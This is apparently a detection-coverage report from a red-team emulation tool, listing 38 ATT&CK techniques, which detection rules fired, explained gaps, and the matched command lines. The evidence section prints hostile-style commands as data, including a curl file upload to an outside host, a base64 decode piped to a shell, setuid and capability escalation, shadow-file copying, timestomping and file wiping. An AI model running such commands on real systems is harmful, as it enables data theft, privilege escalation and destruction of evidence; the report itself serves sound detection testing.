# RedGap coverage report

- Mode: **replay**
- Run: `replay`
- Generated: 2026-08-11T00:00:00+00:00

**27 / 38 techniques detected.**

| # | ATT&CK | Technique | Tactic | Detected | Gap | Firing rule |
|---|--------|-----------|--------|----------|-----|-------------|
| 1 | T1087.001 | Account Discovery: Local Account | Discovery | yes | - | 7c1a9e10-1a2b-4c3d-8e4f-000000000087 |
| 2 | T1057 | Process Discovery | Discovery | no | base_rate | - |
| 3 | T1136.001 | Create Account: Local Account | Persistence | yes | - | 7c1a9e10-1a2b-4c3d-8e4f-000000000136 |
| 4 | T1548.001 | Abuse Elevation Control Mechanism: Setuid and Setgid | Privilege Escalation / Defense Evasion | yes | - | c21c4eaa-ba2e-419a-92b2-8371703cbe21 |
| 5 | T1070.006 | Indicator Removal: Timestomp | Defense Evasion | yes | - | 7c1a9e10-1a2b-4c3d-8e4f-000000000706 |
| 6 | T1082 | System Information Discovery | Discovery | yes | - | 42df45e7-e6e9-43b5-8f26-bec5b39cc239 |
| 7 | T1016 | System Network Configuration Discovery | Discovery | yes | - | e7bd1cfa-b446-4c88-8afb-403bcd79e3fa |
| 8 | T1069.001 | Permission Groups Discovery: Local Groups | Discovery | yes | - | 676381a6-15ca-4d73-a9c8-6a22e970b90d |
| 9 | T1518.001 | Software Discovery: Security Software Discovery | Discovery | yes | - | c9d8b7fd-78e4-44fe-88f6-599135d46d60 |
| 10 | T1083 | File and Directory Discovery | Discovery | yes | - | d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72 |
| 11 | T1033 | System Owner/User Discovery | Discovery | no | base_rate | - |
| 12 | T1518 | Software Discovery | Discovery | no | rule | - |
| 13 | T1140 | Deobfuscate/Decode Files or Information | Defense Evasion | yes | - | ba592c6d-6888-43c3-b8c6-689b8fe47337 |
| 14 | T1222.002 | Linux and Mac File and Directory Permissions Modification | Defense Evasion | yes | - | 34979410-e4b5-4e5d-8cfb-389fdff05c12 |
| 15 | T1070.004 | Indicator Removal: File Deletion | Defense Evasion | yes | - | 30aed7b6-d2c1-4eaf-9382-b6bc43e50c57 |
| 16 | T1497.001 | Virtualization/Sandbox Evasion: System Checks | Defense Evasion | no | rule | - |
| 17 | T1059 | Command and Scripting Interpreter | Execution | yes | - | 8c1a5675-cb85-452f-a298-b01b22a51856 |
| 18 | T1059.004 | Command and Scripting Interpreter: Unix Shell | Execution | yes | - | bed978f8-7f3a-432b-82c5-9286a9b3031a |
| 19 | T1059.006 | Command and Scripting Interpreter: Python | Execution | no | base_rate | - |
| 20 | T1053.003 | Scheduled Task/Job: Cron | Execution / Persistence / Privilege Escalation | yes | - | 6b14bac8-3e3a-4324-8109-42f0546a347f |
| 21 | T1053.002 | Scheduled Task/Job: At | Privilege Escalation / Execution / Persistence | yes | - | d2d642d7-b393-43fe-bae4-e81ed5915c4b |
| 22 | T1548 | Abuse Elevation Control Mechanism | Privilege Escalation / Persistence | yes | - | ed447910-bc30-4575-a598-3a2e49516a7a |
| 23 | T1546.004 | Event Triggered Execution: Unix Shell Configuration Modification | Persistence / Privilege Escalation | no | base_rate | - |
| 24 | T1098.004 | Account Manipulation: SSH Authorized Keys | Persistence | no | rule | - |
| 25 | T1552.001 | Unsecured Credentials: Credentials In Files | Credential Access | yes | - | fa4aaed5-4fe0-498d-bbc0-08e3346387ba |
| 26 | T1003.008 | OS Credential Dumping: /etc/passwd and /etc/shadow | Credential Access | no | rule | - |
| 27 | T1552.004 | Unsecured Credentials: Private Keys | Credential Access | no | rule | - |
| 28 | T1560.001 | Archive Collected Data: Archive via Utility | Collection | no | rule | - |
| 29 | T1005 | Data from Local System | Collection | no | base_rate | - |
| 30 | T1071.001 | Application Layer Protocol: Web Protocols | Command and Control | yes | - | b86d356d-6093-443d-971c-9b07db583c68 |
| 31 | T1090 | Proxy | Command and Control | yes | - | 72f4ab3f-787d-495d-a55d-68c2ff46cf4c |
| 32 | T1567 | Exfiltration Over Web Service | Exfiltration / Command and Control | yes | - | 00b90cc1-17ec-402c-96ad-3a8117d7a582 |
| 33 | T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol | Exfiltration | yes | - | 3f0f5957-04f8-4792-ad89-192b0303bde6 |
| 34 | T1485 | Data Destruction | Impact | yes | - | 2953194b-e33c-4859-b9e8-05948c167447 |
| 35 | T1489 | Service Stop | Impact | yes | - | de25eeb8-3655-4643-ac3a-b662d3f26b6b |
| 36 | T1653 | Power Settings | Persistence / Impact | yes | - | c172b7b5-f3a1-4af2-90b7-822c63df86cb |
| 37 | T1565.001 | Data Manipulation: Stored Data Manipulation | Impact | yes | - | 86157017-c2b1-4d4a-8c33-93b8e67e4af4 |
| 38 | T1592.004 | Gather Victim Host Information: Client Configurations | Reconnaissance | yes | - | 0f79c4d2-4e1f-4683-9c36-b5469a665e06 |

## Gaps

A gap is a finding, not an error — each names why detection did not fire:

- **T1057 Process Discovery** — base_rate: too noisy for a single-event rule; needs correlation (roadmap)
- **T1033 System Owner/User Discovery** — base_rate: too noisy for a single-event rule; needs correlation (roadmap)
- **T1518 Software Discovery** — rule: telemetry present, but no rule fired (closeable by writing a rule)
- **T1497.001 Virtualization/Sandbox Evasion: System Checks** — rule: telemetry present, but no rule fired (closeable by writing a rule)
- **T1059.006 Command and Scripting Interpreter: Python** — base_rate: too noisy for a single-event rule; needs correlation (roadmap)
- **T1546.004 Event Triggered Execution: Unix Shell Configuration Modification** — base_rate: too noisy for a single-event rule; needs correlation (roadmap)
- **T1098.004 Account Manipulation: SSH Authorized Keys** — rule: telemetry present, but no rule fired (closeable by writing a rule)
- **T1003.008 OS Credential Dumping: /etc/passwd and /etc/shadow** — rule: telemetry present, but no rule fired (closeable by writing a rule)
- **T1552.004 Unsecured Credentials: Private Keys** — rule: telemetry present, but no rule fired (closeable by writing a rule)
- **T1560.001 Archive Collected Data: Archive via Utility** — rule: telemetry present, but no rule fired (closeable by writing a rule)
- **T1005 Data from Local System** — base_rate: too noisy for a single-event rule; needs correlation (roadmap)

## Evidence

Every detection is traceable to a rule and the exact event fields it matched:

- **T1087.001** — rule `7c1a9e10-1a2b-4c3d-8e4f-000000000087` on event `ev_cf537b5c2d6309ee`: `CommandLine`='cat /etc/passwd', `Image`='/usr/bin/cat'
- **T1136.001** — rule `7c1a9e10-1a2b-4c3d-8e4f-000000000136` on event `ev_7a82c5de0c49e240`: `Image`='/usr/sbin/useradd'
- **T1548.001** — rule `c21c4eaa-ba2e-419a-92b2-8371703cbe21` on event `ev_d5ef6344d21df72a`: `CommandLine`="sh -c sh -c 'chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'"
- **T1548.001** — rule `c21c4eaa-ba2e-419a-92b2-8371703cbe21` on event `ev_1864a606bfa34d98`: `CommandLine`='sh -c chown root /tmp/redgap_demo_suid && chmod u+s /tmp/redgap_demo_suid'
- **T1070.006** — rule `7c1a9e10-1a2b-4c3d-8e4f-000000000706` on event `ev_cbc5a0941f3f9107`: `CommandLine`='touch -r /etc/hostname /tmp/redgap_agent_file', `Image`='/usr/bin/touch'
- **T1082** — rule `42df45e7-e6e9-43b5-8f26-bec5b39cc239` on event `ev_99347bd29b34f011`: `Image`='/usr/bin/uname'
- **T1016** — rule `e7bd1cfa-b446-4c88-8afb-403bcd79e3fa` on event `ev_89be905f29990329`: `CommandLine`='sh -c cat /etc/resolv.conf'
- **T1016** — rule `e7bd1cfa-b446-4c88-8afb-403bcd79e3fa` on event `ev_9bfec3c43746c75b`: `CommandLine`='cat /etc/resolv.conf'
- **T1069.001** — rule `676381a6-15ca-4d73-a9c8-6a22e970b90d` on event `ev_49618fc95342c4c1`: `Image`='/usr/bin/groups'
- **T1518.001** — rule `c9d8b7fd-78e4-44fe-88f6-599135d46d60` on event `ev_5858e4f5b5f888b7`: `CommandLine`='grep falcond /etc/passwd', `Image`='/usr/bin/grep'
- **T1083** — rule `d3feb4ee-ff1d-4d3d-bd10-5b28a238cc72` on event `ev_75f18b83c6169173`: `Image`='/usr/bin/find'
- **T1140** — rule `ba592c6d-6888-43c3-b8c6-689b8fe47337` on event `ev_5d3bb2fa36bbf0ac`: `CommandLine`='sh -c echo bHM= | base64 -d | sh'
- **T1222.002** — rule `34979410-e4b5-4e5d-8cfb-389fdff05c12` on event `ev_00c8176d1086e85f`: `CommandLine`='chattr -i /tmp/redgap_imm', `Image`='/usr/bin/chattr'
- **T1070.004** — rule `30aed7b6-d2c1-4eaf-9382-b6bc43e50c57` on event `ev_907d693f64ab5cec`: `Image`='/usr/bin/shred'
- **T1070.004** — rule `30aed7b6-d2c1-4eaf-9382-b6bc43e50c57` on event `ev_7b6fed8a1619720b`: `Image`='/usr/bin/rm'
- **T1059** — rule `8c1a5675-cb85-452f-a298-b01b22a51856` on event `ev_e75f11a4f30dafaa`: `CommandLine`='awk BEGIN {system("/bin/sh -c id")}', `Image`='/usr/bin/mawk'
- **T1059.004** — rule `bed978f8-7f3a-432b-82c5-9286a9b3031a` on event `ev_8740587fa4aa997b`: `CommandLine`='env /bin/sh -c id', `Image`='/usr/bin/env'
- **T1053.003** — rule `6b14bac8-3e3a-4324-8109-42f0546a347f` on event `ev_f3c98a47305f8fcc`: `CommandLine`='crontab /tmp/rgcron', `Image`='/usr/bin/crontab'
- **T1053.002** — rule `d2d642d7-b393-43fe-bae4-e81ed5915c4b` on event `ev_fcd5c2933900b77f`: `Image`='/usr/bin/at'
- **T1053.002** — rule `d2d642d7-b393-43fe-bae4-e81ed5915c4b` on event `ev_54b890516dd6d221`: `Image`='/usr/bin/at'
- **T1053.002** — rule `d2d642d7-b393-43fe-bae4-e81ed5915c4b` on event `ev_9e4c0c08ca40adc1`: `Image`='/usr/bin/at'
- **T1548** — rule `ed447910-bc30-4575-a598-3a2e49516a7a` on event `ev_100b7cc319dd8ca6`: `CommandLine`='setcap cap_setuid+ep /tmp/rgcap', `Image`='/usr/sbin/setcap'
- **T1552.001** — rule `fa4aaed5-4fe0-498d-bbc0-08e3346387ba` on event `ev_8d3e5e47fcb613bf`: `CommandLine`='cp /tmp/shadow /tmp/shadow.bak', `Image`='/usr/bin/cp'
- **T1071.001** — rule `b86d356d-6093-443d-971c-9b07db583c68` on event `ev_fefbf2e06148eb58`: `CommandLine`='curl -A RedGap/1.0 http://example.com/', `Image`='/usr/bin/curl'
- **T1090** — rule `72f4ab3f-787d-495d-a55d-68c2ff46cf4c` on event `ev_3e585d11a6f6a1df`: `CommandLine`='sh -c env http_proxy=http://127.0.0.1:3128 true'
- **T1090** — rule `72f4ab3f-787d-495d-a55d-68c2ff46cf4c` on event `ev_dbc4d8fcd7d4edc4`: `CommandLine`='env http_proxy=http://127.0.0.1:3128 true'
- **T1567** — rule `00b90cc1-17ec-402c-96ad-3a8117d7a582` on event `ev_a79022ddc41269be`: `CommandLine`='curl --upload-file /etc/hostname http://example.com/', `Image`='/usr/bin/curl'
- **T1048.003** — rule `3f0f5957-04f8-4792-ad89-192b0303bde6` on event `ev_bd7da375624c5636`: `CommandLine`='python3 -m http.server 8000', `Image`='/usr/bin/python3.13'
- **T1485** — rule `2953194b-e33c-4859-b9e8-05948c167447` on event `ev_c7ff594de63f6974`: `CommandLine`='dd if=/dev/zero of=/tmp/redgap_wipe bs=1024 count=1', `Image`='/usr/bin/dd'
- **T1489** — rule `de25eeb8-3655-4643-ac3a-b662d3f26b6b` on event `ev_eb4fc8e072c9f28d`: `CommandLine`='systemctl stop redgap-nonexistent.service', `Image`='/usr/bin/systemctl'
- **T1653** — rule `c172b7b5-f3a1-4af2-90b7-822c63df86cb` on event `ev_786e40597be48427`: `CommandLine`='systemctl mask hibernate.target', `Image`='/usr/bin/systemctl'
- **T1565.001** — rule `86157017-c2b1-4d4a-8c33-93b8e67e4af4` on event `ev_a6bf52f79c4d73fe`: `CommandLine`='sed -n 1p /etc/hosts', `Image`='/usr/bin/sed'
- **T1592.004** — rule `0f79c4d2-4e1f-4683-9c36-b5469a665e06` on event `ev_0bc95cb60ceab58d`: `CommandLine`='grep root /etc/sudoers', `Image`='/usr/bin/grep'
